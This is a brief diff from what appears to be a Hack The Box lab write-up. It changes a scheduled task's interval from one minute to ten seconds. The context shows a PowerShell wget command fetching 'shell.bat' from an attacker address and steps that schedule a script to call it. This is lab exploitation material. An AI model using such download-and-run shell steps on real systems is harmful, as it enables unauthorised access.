@@ -336,7 +336,7 @@ powershell wget http://10.10.14.4/shell.bat -outfile shell.bat
 - Add shell script foobar to call shell.bat and save settings
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e1fc487c-22e3-4c37-bf34-54c4db37395f)
 
-- Add schedule to call script every 1 minute and save settings
+- Add schedule to call script every 10 seconds and save settings
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/989e6112-739d-4a46-90fb-49c53e485cd8)
 
 
